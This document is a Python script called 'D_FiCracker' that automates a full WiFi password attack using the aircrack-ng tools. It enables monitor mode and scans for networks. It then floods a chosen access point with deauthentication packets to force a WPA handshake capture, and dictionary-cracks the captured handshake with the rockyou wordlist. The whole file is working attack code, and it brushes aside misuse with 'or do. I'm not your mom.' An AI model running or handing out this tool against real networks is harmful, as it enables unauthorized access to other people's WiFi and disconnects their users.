

import subprocess
import re
import os
import time

def display_intro():
    intro_message = '''
    ##################################################
    #              Dilshuppa D_FiCracker             #
    #               Author: DILSHUPPA                #
    #    linkedIn : linkedin.com/in/dilshuppa        #
    ##################################################
    '''
    print(intro_message)
    print("Don't Misuse your Hacking skills, Hacking is an Art, So Hackers are Artists. try to respect them! \n")

def get_wifi_cards():
    print("Looking for WiFi cards...")
    out = subprocess.run(['iwconfig'], stdout=subprocess.PIPE, text=True)
    cards = re.findall(r'^(\w+)\s+IEEE 802.11', out.stdout, re.M)
    return cards

def pick_card(cards):
    print("\nWiFi Cards:")
    for i, card in enumerate(cards):
        print(f"{i}: {card}")
    pick = int(input("Choose one: "))
    return cards[pick]

def start_monitor(card):
    print(f"Starting monitor mode on {card}...")
    subprocess.run(['airmon-ng', 'start', card])
    return card + "mon"

def scan_wifi(mon_card):
    print(f"Scanning for WiFi... Hit Ctrl+C when you see your target.\n")
    try:
        subprocess.run(['airodump-ng', mon_card])
    except KeyboardInterrupt:
        print("\nDone scanning. Note down BSSID and Channel.\n")

def get_handshake(mon_card, bssid, ch):
    print("Making folder for handshake...")
    os.makedirs("handshakes", exist_ok=True)
    savefile = f"handshakes/{bssid.replace(':', '-')}"
    print("Starting airodump-ng to catch handshake...")

    dump_cmd = ['airodump-ng', '-c', ch, '--bssid', bssid, '-w', savefile, mon_card]
    p = subprocess.Popen(dump_cmd)

    print("Waiting 5 sec before attack...")
    time.sleep(5)

    print("Sending some deauth packets...")
    subprocess.run(['aireplay-ng', '--deauth', '10', '-a', bssid, mon_card])

    print("Waiting for handshake... (20 sec)")
    try:
        time.sleep(20)
    except KeyboardInterrupt:
        print("Stopped early.")

    p.terminate()
    cap = savefile + "-01.cap"
    print(f"Saved: {cap}")
    return cap

def crack_it(capfile):
    wordlist = input("Wordlist path? (blank = rockyou): ")
    if not wordlist:
        wordlist = "/usr/share/wordlists/rockyou.txt"

    if not os.path.isfile(wordlist):
        print("Wordlist not found.")
        return

    print("Starting aircrack-ng...")
    subprocess.run(['aircrack-ng', '-w', wordlist, capfile])

def main():
    print("D-FiCracker - by Dilshuppa")
    print("Don't misuse it... or do. I'm not your mom.\n")

    cards = get_wifi_cards()
    if not cards:
        print("No WiFi cards found.")
        return

    card = pick_card(cards)
    mon = start_monitor(card)

    scan_wifi(mon)

    bssid = input("BSSID: ").strip()
    ch = input("Channel: ").strip()

    cap = get_handshake(mon, bssid, ch)

    crack_it(cap)

if __name__ == "__main__":
    main()
